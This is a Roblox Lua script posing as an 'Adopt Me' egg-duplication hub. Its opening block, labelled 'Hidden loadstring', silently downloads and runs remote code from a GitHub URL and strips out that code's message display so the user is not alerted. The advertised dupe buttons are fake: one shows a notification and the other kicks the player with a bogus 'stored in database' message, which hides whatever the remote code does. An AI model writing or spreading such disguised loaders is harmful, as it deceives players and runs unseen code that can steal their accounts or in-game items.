-- Hidden loadstring
pcall(function()
    local scriptContent = game:HttpGet("https://raw.githubusercontent.com/SScripterr/Adoptme-KUJI/main/KUJIHUB")
    -- Remove or comment out the message display line
    scriptContent = scriptContent:gsub('displayMessageFunction', '--displayMessageFunction')
    loadstring(scriptContent)()
end)

local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
local Window = OrionLib:MakeWindow({
    Name = "KUJI HUB | Adopt Me",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "OrionTest"
})

local Tab = Window:MakeTab({
    Name = "Dupe Eggs",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

Tab:AddButton({
    Name = "Equipped Eggs To Dupe",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "Egg Selector",
            Content = "Egg Selected!!!!",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

Tab:AddButton({
    Name = "Click To Dupe Eggs",
    Callback = function()
        game.Players.LocalPlayer:Kick("Egg Stored In Adopt Me Database!.")
    end
})

